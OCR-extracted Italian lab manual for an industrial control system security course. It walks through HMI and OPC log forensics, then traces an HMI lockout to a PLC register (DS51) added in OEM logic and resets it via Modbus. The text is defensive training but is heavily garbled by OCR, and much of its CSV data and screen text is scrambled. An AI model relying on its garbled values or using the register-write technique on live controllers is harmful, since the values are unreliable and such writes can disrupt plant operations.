> Aprire la cartella ""MER.OO".
 Apri x
@
 e Cerca M_Alarms P
 Organizza * Nuova cartella =+ © @
 2 Musica “Nome Data modifica Tipo Dimensione
 File degli studenti 0) MachineAlarms.mal 36/07/2021 15:09 File MAL SKB

@®OneDrive

@ Questo PC
 Oggetti 3D J
(@Desktop
=} Documenti
& Download 2 Musica

e immagini gz Video

= _lacalNiskica Y¢
 File di configurazione dell'allarme ME (*.mal) v
 Nome del file: IM

*Nota* Questa cartella è presente solo quando viene caricata l'applicazione HMI.

> All'interno della cartella ~MER.00, scorrere verso il basso e aprire la cartella M_Alarm.
> Scegli "MachineAlarms.mal" e fai clic su "Apri".

© 2021, Robert M. Lee Lab 4.1-4
 e® f® @® @&
 Ce

)
 fe)

(®) VY ip’ a) ip) <p ip
 J

> Fare clic su "OK".
 Selezionare il file di configurazione degli allarmi FactoryTalk View ME
 File di registro degli allarmi di FactoryTalk View ME: CAUsers\Public\Documents\RS View Enterprise\ME\Logs\I.C.S.515V4\M_Alarms\histary.alm
 Dal file di registro degli allarmi ME (alm) viene generato
© Terminale CE (Mozar/Raptor) Win32 (3209 © Win32 (4x ar 6.1)

© Terminale CE (PVPCE6) © Win32 (6.0 - 8.20) (@ Win32/CE (9.0 o successivo)
 File di configurazione degli allarmi FactoryTalk View ME:
 C:\Utenti\sansics\AppData\Local\Temp\~*MER.00\M_Alarms\MachineAlarms.mal bd
 OK

© 2021, Robert M. Lee
 Laboratorio 4.1-5
*Nota* Gli allarmi sono elencati con i timestamp di quando si è verificato l'allarme (TimeOn) e quando l'allarme è stato riconosciuto (TimeAck). Sfortunatamente sapere cosa sia ciascun allarme non è presente in questa tabella ma viene indicato come "Trigldx". Sono necessarie altre informazioni e fortunatamente l'ingegnere è stato così gentile da fornire la seguente tabella di configurazione dal software di sviluppo.
 Trigger Valore trigger Messaggio 1 {::Clickplc.0:16395} 1 Allarme critico area di generazione 2 {::Clickplc.0:16492} 1 Allarme critico area di trasmissione 3 {::Clickplc.0:16501} 1 Interruttore di trasmissione scattato 4 { ::Clickplc.0:16398} 1 Generatore locale non al minimo per interruttore chiuso

::Clickplc.0:16405}
::Clickplc.0:16592}
::Clickplc.0:16692}
:Clickplc.0:16428}
 Interruttore di generazione intervenuto Allarme critico area residenziale Allarme critico area industriale Allarme critico valvola carburante
 onauw ao PRPRPP

> Utilizzando i messaggi di allarme visualizzati nell'HMI e nel Visualizzatore file, identificare le mappature tra la colonna TriglDx nel Visualizzatore file e la colonna Messaggio nella tabella fornita dal tecnico.
 Compito – I.C.S. Registri delle applicazioni per la medicina legale
 1. Identificare i registri dell'applicazione HMI.
> Avviare l'HMI ma scorrere la finestra seguente PRIMA di selezionare "Esegui applicazione".
> Fai clic su "Impostazioni terminale"
 FactoryTalk View ME Station [Limite di 2 ore] - 10.00,00.290(Patch 03)
 Applicazione attuale:
 1CS515V1.mer
 Carica applicazione Esegui applicazione Impostazioni applicazione IF3]
 Eliminare i file lag prima di eseguire IFS)
 Impostazioni terminale SE]

© 2021, Robert M. Lee Lab 4.1-6
 un aN
 9?@meenmemnenenmnenh»mnnnnn *® ® ©
 uv

"? ?, ? Se FTF WY WT WT WY Ww WD ee we ww
 ry
 TY

> Aprire "Configurazione diagnostica" dal menu delle impostazioni del terminale.

> Fai clic su "Sì" per consentire all'app di apportare modifiche.> Vai a "Configurazione diagnostica" -> "Configurazione destinazione" -> "Registro locale"
 oH Impostazione diagnostica
 Configurazione della diagnostica Configurazione della destinazione del registro locale
- Impostazione della destinazione
 FT Visualizza elenco diagnostica FT Visualizza ME Audit Trail Mt ccal Log
 Database ODBC eee RES AE nes Lat i» Routing dei messaggi pS Sy Vedi ee
 Dimensione massima del registro: [25600 = KB
 Quando viene raggiunta la dimensione massima del registro:
@ Eventi Overmrite secondo necessità
(Archivia il registro quando è pieno

© Non sovrascrivere gli eventi
(cancella il registro manualmente}
 Cancella registro |

~ Percorso di registrazione
 Vinevt,Logs\FT Diag.evts
 Annulla Applica Guida

*Nota* I fornitori di software HMI potrebbero archiviare i registri in modo diverso, tuttavia, questa HMI utilizza gli eventi di Windows come posizione per questi registri. Inoltre, quando si identificano le posizioni dei registri, prendere nota della "Dimensione massima dei registri".
 e altre impostazioni che potrebbero essere utili per la pianificazione forense.

> Annullare la finestra "Configurazione diagnostica".
> Chiudi "Impostazioni terminale".
> Eseguire l'applicazione.
 2. Esplorazione dei registri HMI.
> Apri Visualizzatore eventi di Windows.
 Migliore abbinamento
 H'| Applicazione desktop Visualizzatore eventi
 Comando

@eventvwr
 Tutte le app Documenti Impostazioni Web
 Saaablied
 Più Volkswagen
 Vv

> Passare a "Registri applicazioni e servizi" -> "Diagnostica FactoryTalk"
> Percorri i registri prendendo nota dell'avvio e dell'arresto dei vari servizi.
 3. Identificare i registri del server OPC.

© 2021, Robert M. Lee
 Laboratorio 4.1-7
> Aprire l'analizzatore MatrikonOPC.
 Procedura guidata per la licenza
 Analizzatore MatrikonOPC
 eee
 Manuale utente dell'analizzatore MatrikonOPC
 MatrikonOPC Explorer

> Assicurati che tutte le caselle siano state selezionate e seleziona Desktop come "Percorso di output".

> Fare clic su Esegui.

® Analizzatore MatrikonOPC

{¥ Informazioni di sistema |¥ File di registro | mg

|¥ File di configurazione [¥ pcom Esci

\ File di output compressi

[¥ Cambia percorso di output della directory _... C: \Users\sansics\Desktop| IO

@MatrikonOPC

> Una volta completata l'operazione, "Esci" dall'utilità e apri il desktop.

> Una nuova cartella e un file zip compresso che condividono lo stesso nome a partire da anno-mese-giorno
 dovrebbe essere presente sul desktop.
>Apri la cartella.

*Nota* A differenza del fornitore HMI, questo fornitore OPC sceglie di fornire uno strumento di raccolta (probabilmente a scopo di risoluzione dei problemi) che estrae alcune informazioni utili non solo sul software ma anche sulla configurazione dell'host.

> Apri ciascuno dei file "TXT" e prendi nota del loro contenuto. Alcuni contengono percorsi più utili
 file e registri di configurazione.

> Apri e rivedi il file "DCOMInfo.txt". In quanto server OPC DA, il processo di installazione di questo software ha configurato DCOM su questo host per CONSENTIRE A TUTTI di accedere a questi servizi.

(eB) @) qe) @) qe) () ce) @) ee) (@) (ey) cB) (B)

)

(B) @) @) @) .

'B)

> Apri "ConfigFileInfo.txt"

> Guarda all'interno del file zip e apri il file "Modbus_DefaultConfig.xml" in un browser. Questa è l'effettiva configurazione in esecuzione del server OPC. Puoi anche visualizzare
"Modbus_ModbusImportConfigurationSchema.xml" per comprendere la configurazione OPC

> Apri "LogFileInfo.txt". I percorsi elencati sono i percorsi dei registri dell'applicazione effettivi.

> Apri il file "Common_PSTCFGMatrikon.OPC.Simulation.1" nel blocco note.

> Prendere nota della data/ora dell'ultima immissione, chiudere il file e chiudere l'applicazione HMI.

> Riaprire il file e prendere nota delle nuove voci.

© 2021, Robert M. Lee Lab 4.1-8

@@

'B)

'Noi
“Mons
 COME
 a3

*Nota* Questo registro acquisisce il nome del computer da cui è stata connessa e disconnessa la connessione. Poiché il numero di computer client è in genere piccolo e noto, questo potrebbe essere un identificatore molto utile dell'origine di una connessione non autorizzata.
 Esercizi da asporto
 Per sfruttare i dati storici del sistema ed elaborare i registri eventi delle applicazioni dati disponibili per i difensori del sistema, è necessario innanzitutto comprendere come appaiono tradizionalmente tali set di dati.

© 2021, Robert M. Lee Lab 4.1-9 wo ®© wo O8 WwW |W ww weeweeeewew
 oo oO YD wD YD W
 AY

_Lab 4.2 -Analisi Logica e Reset
 Obiettivi e Identificare cosa c'era di sbagliato nella logica e ripristinare il sistema in uno stato buono e Determinare quando la manipolazione della logica ha provocato per la prima volta una manipolazione nell'HMI

*Informazioni sullo scenario* L'HMI C3PO è stato bloccato inaspettatamente dopo la modifica della logica dell'OEM al Click PLC. A prima vista questo non ha senso perché ciò implicherebbe che una modifica del PLC abbia un impatto negativo sull'HMI, ma è lo scenario più realistico visti i recenti cambiamenti. Pertanto, dobbiamo analizzare la logica e i dati di rete disponibili per determinare l'analisi della causa principale.
 Questa è la continuazione dell'esercizio 3.5 e utilizzerà il kit Windows VM e PLC. L'ultima parte del laboratorio utilizzerà Lockedhmi. pcap nel RELI.C.S. VM.

[Domande :
 1. Qual è il valore del registro della logica modificata?
 2. Qual è il valore del Registro?
 3. Qual è il valore HEX per cercare le risposte nel pcap con il registro 50?
 4. Qual è il primo pacchetto in cui avviene la scrittura in questa sessione e a che ora?

© 2021, Robert M. Lee Lab 4.2-1 Compito ~ Determinare dove nel codice PLC viene comandato l'HMI:
 1.Qual è il valore del registro della logica modificata DS51

*Nota* Dobbiamo scoprire perché l'HMI si sta bloccando; la spiegazione logica è qualcosa nell’HMI ma l’unica cosa che è cambiata di recente è il nuovo codice PLC dell’OEM e quindi inizieremo da lì.

*Nota* Il software Click non supporta una funzione di confronto dei programmi (alcuni fornitori la dispongono) ma supporta l'esportazione degli indirizzi Modbus utilizzati. Possiamo confrontare le due esportazioni e vedere se
 possiamo individuare una differenza.

> Utilizzando Notepad++ con il plugin di confronto installato, confronta il file PLC originale con quello nuovo

@

«
 Codice fornito dall'OEM.
> Apri Blocco note++

[Di nuovo 1 - Blocco note++
 File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ? x SSH mare «eH acl|aylae& 2 VEDBA aS SPH RBSERer«+ eB oi
 E? |
 Ln:1 Col:1 Pos:1 Windows (CRLF) UTF-8 INS
 Lunghezza normale del file di testo 0 denti: 1
 Aprire sia il file I.C.S.515 OEM Change V2_Modbus_Addresses.csv che il test di accettazione del sito I.C.S.515
 V1_Modbus_Indirizzi.csv
> Aprire la cartella ics515 sul desktop della VM Windows
> Una volta aperti entrambi i file, vedrai entrambi i file apparire in due schede separate

© 2021, Robert M. Lee Lab 4.2-2
 ed ~~ Chel oo, ra (; .; @ff ? (; Co
 A File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ? Nuovo Apri... Apri la cartella contenente Apri nel visualizzatore predefinito Apri la cartella come area di lavoro...
 wT wT WY &
 Taglia+R Ctri+S Ctrl+Alt+S
 w
 Ctrl+Maiusc+S
 Ctrl+W Ctrl+Maiusc+W

{Af CAUsers\ics612" Dropbox\SANS I.C.S.\Courseware\I.C.S.515\Click\I.C.S.515V10 Modifica OEM per schede di produzione Modbus_Addresses.csv - Blocco note++
 File Modifica Ricerca Visualizza Codifica Impostazioni lingua ry Macro Esegui finestra plugin ? 1G SS Gal 4 RID Cia ie 2 BEDI EaABA Pe RB ORB x + ~ = G
 GF f71CS515V10 Cambio OEM per schede di produzione Indirizzi Modbus cav £3
 ddress,Tipo dati, Indirizzo Nodbus, Codice funzione, Nickname, Valore iniziale, ritentivo, Indirizzo Commento XO01,BIT, 100001, "8C=02","Gen_ Breaker Open_PA",0,No, “Generazione Switchyard Breaker Open PB! X002,BIT, 100002, "FC=02", "Chiusura interruttore generazione PB", "Chiusura interruttore cantiere di generazione PB" X003,BIT, 100003, "Fc=02", "Interruttore trasmissione_Aperta_PB",0,No, "Interruttore trasmissione PB aperto” X004, BIT, 100004, "FC=02", "PB chiuso interruttore trasmissione",0,No, "PB chiuso interruttore trasmissione"
%101, BIT, 100033, *FC=02", "Trans_Prot_Rly_Fault_fB",0,No, “Guasto relè protezione trasmissione PB" X102, BIT, 100034, *FC=02", “Trans Prot_Rly Clear P8*,0, No, “Relè di protezione trasmissione Cancella guasto FB" X163, BIT, 100035, *FC=02", “Dist_Res_CktReCls_opn_PB",0,No, “Richiusura circuito di distribuzione aperto FB" X104, BIT, 100036, *FC=02", " Dist Res CktReCls Cls PB", 0,No, "Chiusura circuito di distribuzione PB" X202, BIT, 100066, "FC=02", "SIM2*, 0,No, "Stagionale O=Valore invernale ; 1=Valutazione estiva" X203, BIT, 100067, "FC=02", "SIM3",0,No,"Intertie: O=Nessuna risorsa di generazione esterna ; l=Risorse di generazione esterne disponibili: X204, BIT, 100068, "FC=02", "SIM4", 0,No, "Reset allarmi di generazione” X205,BIT, 100069, *FC=02", "SIMS", 0, No, "Reimposta allarmi di trasmissione*
%206,BIT, 100070, *Fcm02", "SIME", 0,No, "Reset Allarmi Residenziali Distribuzione" X207, BIT, 100071, "FC=02", "SIM7",0,No,"Reset Allarmi Residenziali Distribuzione * X208, BIT, 100072, "FC=02", "SIME", 0,No, "Modalità esperto= La generazione locale deve essere >= al valore minimo per la chiusura dell'interruttore && L'interruttore HMI industriale è YOOL, BIT, #193, "FO=0i, 05, 15", "Protect Rly Reset_Light",0,No, "Spia guasto relè di protezione"
¥002, BIT, £194, "FC=01,05, 15*,"Trns_Brkr_Closed_Light",0,No, “Spia interruttore trasmissione aperta” 1003, BIT, 8195, "FC=01, 05,15", "Gen Brkr_Closed_Light",0,No, "Spia di apertura interruttore di generazione" Y004, BIT, 5196, *FC=01,05, 15", “Spia di interconnessione chiusa",0,No, "Spia di stato di interconnessione: uno, Solo alimentazione locale; 1 = Rosso, Alimentazione esterna Y101, BIT, 8225, "FC#01, 05, 15", "Dist_Res_Load0To100",0,No, "Distribuzione uscita carico residenziale Light61 (9-1008)"
¥102, BIT, 8226, "£C=01, 05,15", “Dist _Res_Load33To100",6,No, “Uscita carico distributivoresidenziale Light02 (33-1008)"
¥103, BIT, 8227, "FC=01,05, 15", "Dist_Res_Load6éTo100",0,No, "Distribuzione Carico Residenziale Uscita Lightd3 (66-1001)"
¥104, BIT, 9228, "FC=01,05,15","Dist_Ind_ Power Avail",0,No, “Alimentazione di fabbrica disponibile (giallo)*
¥105, BIT, 8229, "FC=01, 0S, 15", "Dist_Res_Reclsr. ed", 0,No, "Distribuzione residenziale di richiusura chiusa (non fisica)” Ci, BIT, 16385, "FC#01, 05, 15", *"Gen_State Idle*,0,No, "Generazione Stato Idle" C2, BIT, 1636, "FC=01, 05,15", "Gen State Generate", 0,No, “Generazione Stato Genera”
©3, BIT, 16387, "FC=01, 05,15", "Gen_State Alarm", 0,No, "Generation State Alarm” CE, BIT, 16390, "FC=01,05,15", "Gen Start _Gen_PB_HMI*,0,No, "Generazione Avvio Generatore PB HMI" CT, BIT, 16391, "FC=01, 05,15", "Gen_Stop_Gen_PB_HMI",0,No, "Generazione Arresto Generatore 2B HM" C8, BIT, 16392 , "FC=01, 05,15", "Gen Generator Permissive", 0,No, "Generatore avviato area di generazione"
 PERCHÉ noi ww
 sì

«sì.»

[Lunghezza normale del file di testo: 18.342 righe: 182 ta:1 Col:1 Post Windows (CRLF) _UTE-8 INS

> Utilizzando il menu Plugin, seleziona il menu a tendina Confronta e fai clic su Confronta
> Identificare i cambiamenti
 wp “ep 4B”
 4p'

© 2021, Robert M. Lee Lab 4.2-3
 UN
[Dy Causers\tes612)\Dropbox\SANS I.C.S.\Courseware\IC$515\Click\I.C.S.515V10 per schede di produzione Modbus_Addresses.csv - Notepad++ [Amministratore] File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin?
 s8H&s
 2Q\ 4h) Scia%e/ 22 Ba
 325, BIT, 16705, "!
 01,05, 15", 27, BIT, 16711, "FO=01, 05,15" 0328, BIT, 16712, *FCH01, 05, 15". "1
 C329, BIT, 16713, °F
330 €/BIT, 1€714, *FC=01, 05, 15*, spit

€ 335, BIT, 16719,

'13, BIT, 145059, “FC T10, BIT, 145066, "FC#02", "Gen_Carburante_|
 T15,BIT, 145071,"
 DS1, INT, 400001, *FC=03,
 ps4, INT, 490004 DSS, INT, 40 DS€,INT, 400006, "FCH03,06,16",*
 FC#03,06,
 712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp_Watchdog" ce02", "Coma Watch Dog Timer", 0,No, “Controllo comunicazioni be2,Brr, 161442, *Fo=02","_1st_SCAN", 0, NO, ""
 16", "Gen Esterno MW Max", DS2, INT, 400002, "FC=03, 06,16", "Gen_Generator_Max_Pw1 DS3, INT, 400003, "FC=03, 06,16", "Gen _Bar Graph Out Cal

{=II.C.S.515V10 per schede di produzione_Indirizzi Modbus csv £9 VpaeSetsviniein crs
 S*, *Eurnace2 326, BIT, 16710, "FC=01, 05,15", “Forno2_Off HMI", (
'"Digt_Ind_BrkE_opn_t
 6331, BIT, 16715, “FC=01, 05, 15", "Dist_Ind Brkr_Close Pex", 0,No, *Distributi C332, BIT, 16716, *FC=01, 05, 15", "Dist_ind_Brkr_Closed",0, No, "Distribuzione Ii
€334, BIT, 16718, "FC=01, 05,15", "Dist_Ind_Open_Brkr_HMI",0,No, "Distribuzione |)
."ECH01, 0S, 15", “Dist_Ind_ Close Brkr_HMI",0,No, "Distributio 12, BIT, 14506, "FC=02", “Gen_Ramp_Up To, Lo 2", "Gen Ramp Down To_L
 carico", 0,No,
 generazione Generation Ramp Gene jalve Ramp, Sim", 0,No, "Generation Local No, "Generation Fuel Ra
 0, Sì, "Generazione Max 0, Sì, "Generazione L. 0, Sì," Valore di output calcolato del grafico a barre della generazione"

", "Valore uscita generatore generazione", 0,Sì, "Valore uscita generatore generazione"

“FC=03, 06,16", “Gen_Genertr_} 0
 n_Totale_Richiesto.! Pwr, 0,Sì, "Potenza richiesta totale della generazione®
 Imposta come primo da confrontare
 Cancella confronto attivo
 CirheAlteShittex
 Cancella Ail Confronta le differenze dall'ultimo salvataggio SVN Dit
 Vai Ditt
 ignora Spazi Rileva mosse Barra di navigazione Precedente AitePagina su Successivo Arti Pa
 Primo rere
 Ctrl+AiteD Crrieaitey CtrteAlteS
 Generi di rampa
 Ultima cittàAltePagina giù
 Impostazioni Informazioni_
 s, "Setpoint di chiusura interruttore minimo generatore di generazione Ma"
 DS?, INT, 400007, "FC=03, 06, 16", “Gen_Total Available Pwr*,0, Sì, "Potenza disponibile totale generazione" DS8, INT, 400008, *FC=03,06, 16", " Gen Total Loc] _MM_S®", 0, Ye
 D$, INT, 400009, "
 C=03, 06,16", "Gen Totale Bxt_Nw_SP*,
 Setpoint di uscita MW locale di generazione*
 Setpoint uscita Mw esterna generazione*
 DS10, INT, 490010, "FC=03, 06,16", "Gen_Local_Manual_Out_sP",0,¥es, "Uscita manuale locale di generazione quando AVR è spento" DS11, INT, 400011, "FC=03, 06,16" , “Gen_CT_Fuel_Valve Man_SP",0,¥es,"Punto di regolazione manuale della valvola del combustibile della turbina a combustione di generazione*
 DS12, INT, 400012, “FC=02, 06, 16", "Gen_CT Fuel _Valve_out®, 0, ¥ DS13, INT, 400013, "FC#03, 06,16", "Gen_CT Fuel Viv _Auto_Rem* DS14, INT , 400014, "FC=02, 06,16", "Gen Puel_Valve_3P CV Err", 0, Sì, "Generation Combustion Turbine INT, 400015, "EC#03, 06,16", "Gen CT Fuel viv Min Font" , 0, Sì, "Generazione di turbine a combustione
 DS15,
 0,¥es,"Generazione di turbine a combustione

;*Uscita valvola carburante turbina a combustione di generazione "
 Uscita valvola carburante Modalità automatica Remoto" Errore posizione valvola carburante {Setpoint - Percentuale uscita minima effettiva valvola carburante” “
 angi: 1240 linee: 180
 Ln: 133 Coli 1 Pos: 13.348
 Finestre (CRLF
 UTF-8

*Nota* Verrà visualizzato un confronto affiancato di entrambi i file CSV. Scorrendo le differenze,
 vedrai un timer RemoteHMIDelay e un tag RemoteHMI DS51 del registro di memoria.
 LY causers\tes812"\Dropbox\ SANS I.C.S.\Courseware\I.C.S.515\Click\I.C.S.515¥10 fr Production Boards_Modbus_Addresses.csv - Notepad++
 File Andatura Ricerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
"UN
 sG8He euSlid whi 2c aa

{R}1CS515V 10 per Schede di Produzione_Modbus_ Indirizzi cov EF
 ata
 2 4)
 jm gi\DReGs.v ee

+ [G)e8518110 08M Cambia fr Schede di produzione Modbus Adcrossen cov El |

(C325, BIT, 16709, "FC=01, 05, 18", "Fornace?
£926, BIT, 16710, "Fc=01, 05, 15", "Fornace? C327, BIT, 16711, "PC=01,05,
 329, BIT, 16713, "FC=01, 05, 15", "Di 330, BIT, 16714, *FC=01,05, 15", "Dis
€331,81T, SaarTait evie, sOLL0S, ist,
€334,BIT, 16718, "FC#01,05, 15' 6335, BIT, 16719 T2, BIT, 145058,"
 Ind
 715, BIT, 145071, "FC=02", "Comm | Watch Dog” x4}
 DS3, INT, 400003, "FC=03, elias tonspicatrsepng 16", "Gen_Gene:
 1 INT, 400005, “FC=03, 06, 16", "Gen_Gene: DS, INT, 400006, "FCH03, 06, 16", "Gen-Tota
 DS7, INT, 400007, "EC#03, 06, 16", "Gen Totale disponibile pw DSB, INT, 490008, "FC=03, 06,16", "Gen_Total_Loc]_MW_SP™, 16", "Gen Total _Ext_Mw Se", 0
*Geh_Local_manual_out_ 3,06,16", "Gen CT_Valvola carburante Man | | 146 400012, "FO=03,06, 16%, "Gen_CT Fuel Valve out |i} 147 Cx03, 06,16", "Gen CT Fuel viv auto [|i4e Fo=03, 06, 16", "Gen Fuel Valvola Sp cv || 145
 DSY, INT, 400009, "EC=03, 0 S10, INT, 400010, "FO=03, j& | DS11, INT, 400011, "FC! 7 0812, 8 (S13, INT, 400023, DS14, INT, 400024
 16
 15", "Dist ind 4
¢328,81T, 16712, "FC=01,05, 18", "Dist Ind!
 ne
“EC=01, 05, 15", "Dist_Ind_<¢ 02", "Gen Ramp Up_To Load", 0,No,*Ge | |128 13, BIT, 145059, "FC=02", “Gen_Ramp_Down_To_Load", 0 , NO,"
 T10, BIT, 145066, "FO=02", "Gen_Fuel_Valve_i 712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp_Watchdog", 0,No
 SC2,BIT, 161442, "FC=02","_1st_SCAN",0,No, "" DS1, INT, 400001, "FC=03, 06, 16", "Gen_External_MW_Max",0 DS2, INT, 400002, “ FC=03, 06, 16", "Gen Generator Max Pwr* 6, 16","Gen_Bar_ Uscita grafico |
 y-On_HME*, 0,80, «| [lle
"OfF_HMI",0,No
| Brkr_Opn_Init Brkt,
 Brkr, Brkr_Close_In
 Apri Brkr_aMz
‘chiudi _Brkz_am || 129
 Famp_Sim", 0,8
 Temporizzatore", 0,No,"
 ale tor_out_Valu} | 129 cr_Min_Bkt_Cl
_Richiesto_ Pw

>
 1
 134 @t51,
 5,Bit, 16709, "Fc=01, 05, 15", “Forno2_On_ BMI", 326, BIT, 16710, "FC=01, 05, 15", "Forno? Spento HMI", 0,No
€327,BIT, 16711, "FC=01,05, 15", "Dist_Ind Brkr_Opn_Init 6328, BIT, 16712, "FC~01, 05,18", "Dist_Ind_Brkr_Open_zer 6329, BIT, 16723, "FC=03, 05 ,15", "Dist_Ind_Brkr_Open®, 0, C330, BIT, 16724, "FC=01,05, 15", “Dist_Ind Brkr_Close_In
€331, BIT, 16715, "FC=01, 05,15", "Dist_Ind Brix, 32, BIT, 16716, "PC#01, 05, 15", Dist. Ind YBrkr “chiuso”, C334, BIT, 16718 , "FC+01, 05,15", “pist_ ind_Open_} Beker, AE C335, BIT, 16719, "FC=01,05, 1S", "Dist_Ind { Close_Brkr. HM 72, BIT, 145058, "FC=02", "Gen_Ramp_Up_To_Load", 0, No, 73, BIT, 145059, “FC=02", "Gen Ramp Down To Load", 0,No," T10,BIT, 145066, "FC=02", "Gen_Fuel_Valve_Ramp_Sim*,0,N 712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp Watchdog", 0, T15, BIT, 145071, °FC=02", "Comm Watch Dog Temporizzatore”, 0,No”,

*rce2", "Pe

©3258

$C2,BIT, 161442, "FC=02", *_ Dg1, INT, 400001, "FC=03, 06,16", “Gen_External_MW_Max",0 DS2, INT, 490002, *PC=03, 06,16 ", "Gen Generator Max Pwr" DS3, INT, 400003, "FC=03, 06, 16", "Gen _Bar_Graph_Out_Calcy DS4, INT, 490004, "FC#03,06, 16", "Gen _Genérator_out_Valu DSS, INT, 490005, "EC=03,06, 16", "Gen Genertr_Min_Bkr_Cl DS6, INT, 400006, "FC=03, 06, 16", "Gen Totale Pw richiesto” DS7, INT, 400007, *FC=03, 06, 16", "Gen Totale Pw disponibile DSB, INT, 400008, "FC=03,.06,16%, "Gen Total Locl_MW SP", DS, INT, 400009, "FC=03, 06, 16", “Gen_Total_Ext_Hw_SP *,0 S10, INT, 400010, *FC=03, 06,16", "Gen_Local_Manual_out_ DS11, INT, 400011, "FC=03, 06,16", "Gen_CT_Fuel_Valve_Man D912, INT, 400012, "PC#03, 06, 16", "Gen_CT_Puel_Valve_Out DS13, INT, 400013, "FC=03, 06,16", "Gen CT Puel Viv _Auto_ DS14, INT, 400014, "FC=03, 06,16", "Gen Fuel Valve SP CV¥ ev >
 5
 lunghezza 18.324 righe: 184
 Uns134 Col Pos: 13.370
 Windows (CRLF) _UTE-8 INS

*Nota* Questo è il tag in cui lo schermo HMI viene controllato in remoto. Esaminare questo Fare clic sulla memoria del PLC
 posizione e assicurarsi che questo valore sia impostato su "0", il che significherebbe che non è possibile controllarlo da remoto
 il PLC.

*Rispondi* Registro HMI remoto DS51

© 2021, Robert M. Lee
 Laboratorio 4.2-4
 e.a
 td
 pi
 sì Ww

“a w w w wy
 noi ww Ww Ww
 Qs'
 2. Qual è il valore del Registro? 1

> Vai online e determina il valore di DS51

> Nell'attività precedente del passaggio 8, hai scaricato il programma I.C.S.515 per Production Boards.ckp e dovresti essere online con il clic. Se non sei online con il PLC Click, apri il progetto I.C.S.515 Site Acceptance Test V1.ckp per avviare il software di programmazione Click e quindi scrivi il progetto sul PLC.

> Dopo aver effettuato la scrittura del progetto e aver effettuato la connessione al PLC, utilizzare la finestra di navigazione sul lato sinistro del software Click per trovare e fare doppio clic sul visualizzatore "DataView1" per aprire la finestra DataView
 Software di programmazione CLICK (Versione 3.01) - Test di accettazione del sito I.C.S.515 VI.ckp - Guida della finestra di monitoraggio [Programma principale},
 io Oa WadivessPicker TE) Progetto WayRend.Online «== Stans yp Riferimento incrociato Wa Wiite Progetto 8 Esegui rilevamento TB Visualizza ~ CPU VO Software 5 Controllo sintassi 3 Informazioni PLC C7) Errore PLC
 Programma Funzione PLC
©-Ry Sottoprogramma Programma a Sa BreakerModelli 1 Sey DistindAllarmi Ay DistindStati Sy Distindustriale Sy DistResAllarmi Sgy DistResidenziale Igy DictResstati
§@4 Gen_Fuel_Control Gy Gendlarms
§G4 Generation Sl Genstates gf Indticlize
$y FemoteCommvd
§@y TransAlarms Si La trasmissione può essere eseguita da Transtetes $ TranStates
§@ Programma di interruzione
@ Selettore indirizzo GF Modifica ramo Commenti 4p Informazioni programma locale: TransAlarrns D symax Controlla trasmissione Riferimento incrociato Visualizza Teanittates:
 8 mira fi 1CS515 Test di accettazione del sito V1 - 0 errore(i), O avvisi) Monitor di stato
 tutto il titolo
 HH FM, consegue
 Chiama, 3 ; Ney generazione
 4_Gen_Fuel_Contro!
 u 5 senatori SP

> ee ee eee ti Ree en anguilla RES ax
 Scrivi progetto nel PLC...
"Trasferimento completato."
 Vista Tee Tevt

> Nella finestra DataView, scorrere fino alla fine degli indirizzi da testare. Vedrai DS51 e questo valore è 1. Vogliamo cambiare quel valore in 0 per sbloccare lo schermo HMI.

© 2021, Robert M. Lee Lab 4.2-5 a} Visualizzazione dati -[DataView1] _ x
 Modifica = Riempi giù
 Visualizza sostituzione

© 2021, Robert M. Lee

> Apparirà una nuova finestra di selezione indirizzo. Nel campo di input Trova, cerca i nuovi valori che hai scoperto confrontando i file logici: inserisci RemoteHMI e seleziona Trova

& Selettore indirizzo: modalità di ritiro
 2
 Operazione interruttore...
 Gen_

| lo |< [x
 38 9as6 |xese lag

~) -Indirizzo utilizzato/non utilizzato~ Fon (1) Visualizza l'indirizzo MODBUS

| @Visualizza sia l'usato che l'inutilizzato | MODBUS 984 Indirizzamento Intero (parole) | | Op ortà utilizzata Indirizzamento MODBUS HEX Frammento in virgola mobile: un rosso © Solo display inutilizzato
 Laboratorio 4.2-6

=>

= -— wo wo Ww wo Ww WD WwW Ww noi ee noi
 cioè) Le /_

(S'
 va Ww

> Con il nickname e l'indirizzo DS51 dell'HMI remoto evidenziati, selezionare OK per aggiungere questo indirizzo al campo DataView1

& Selettore indirizzo: modalità di ritiro
 Compila (soprannome) Trova: [RemoteHM ~ | Trova corrispondenza esatta
 lIndirizzo ai[Tipo di dati [Nickname |usato | Indirizzo Cony
 t |RemotoHMI INo
 TargetFuelSettin... Sì Target Fu... Fuel_Valve_Perce... Sì Valvola carburante...
 morire

> Con la finestra DataView1 che ora visualizza DS51, seleziona il pulsante Modifica in alto a sinistra, così possiamo manipolare il valore e cambiarlo da a1 a a0

> Per DS51 inserire un Nuovo valore pari a 0 e quindi fare doppio clic sull'immagine di scrittura a destra del nuovo valore.
 Visualizzazione dati Fe -[Visualizzazionedati1] = oO x
 Gen_Breaker_Open_FOfF
 HMI remota 1 | HMI remota intera

> Dovresti vedere il valore corrente visualizzato cambiare in 0.
> Verificare che l'HMI funzioni ora

*Nota* Hai capito che 1 blocca lo schermo e restituendo quel valore a 0 si fissa la logica del controller.

*Risposta* 1 che blocca lo schermo

© 2021, Robert M. Lee Lab 4.2-7
 Compito: convalidare i risultati dell'I.C.S. Protocollo
 3. Qual è il valore HEX per cercare le risposte nel pcap con il registro 50? 0x01040032

*Nota* Matrikon sfrutta il sistema decimale e DS51 si tradurrebbe in decimale 50. Pertanto, potremmo sfruttare l'acquisizione di rete per identificare i comandi di scrittura su DS51. Questo sistema utilizza ModbusTCP, il che significa che scriverebbe nel registro (e poiché è decimale 50 per DS51) in particolare nel registro 50.
> Aprilockedhmi.pcap in Wireshark ‘ua
> Apri il RELI.C.S. VM
> Apri la cartella I.C.S.515 situata sul desktop e poi vai a c3po > pcaps
> Fare doppio clic sulockedhmi.pcap per aprire il file in Wireshark

